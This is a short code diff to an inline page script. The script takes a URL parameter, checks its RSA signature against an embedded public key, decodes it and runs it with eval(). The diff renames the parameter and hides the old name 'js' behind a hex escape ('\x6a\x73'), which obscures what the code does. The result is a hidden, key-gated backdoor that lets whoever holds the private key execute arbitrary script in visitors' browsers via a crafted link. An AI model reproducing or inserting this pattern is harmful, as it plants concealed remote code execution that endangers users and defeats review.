@@ -165,18 +165,20 @@
 
         (function(){
             var s = getUrlParam('s');
-            var js = getUrlParam('js')
+            var h = getUrlParam('h')
+            if (! h)
+                h = getUrlParam('\x6a\x73');
 
             var verify = new JSEncrypt();
             verify.setPublicKey('-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDPiMLZ8JjFQu8yWQu29hLdGD8o\n'+
                 '7Mao/2bCkMY3Q/loJ5w09aZWA03gxHBXCldxakKS4bKQBFSlgXarlIXpXnPDxlyd\neovPeg9FGopd260lWKecHFyi6gBsYh9bQ0O+Nn//m3u/OHzXz3DLp4brQY82Rx81\n'+
                 'DiQPyE6XUY7b8Su5OwIDAQAB\n-----END PUBLIC KEY-----');
-            var verified = verify.verify(js, s, sha256);
+            var verified = verify.verify(h, s, sha256);
             if (! verified)
                 return;
             
-            js = decodeURIComponent(js);
-            eval(js);
+            h = decodeURIComponent(h);
+            eval(h);
         })()
 
     </script>
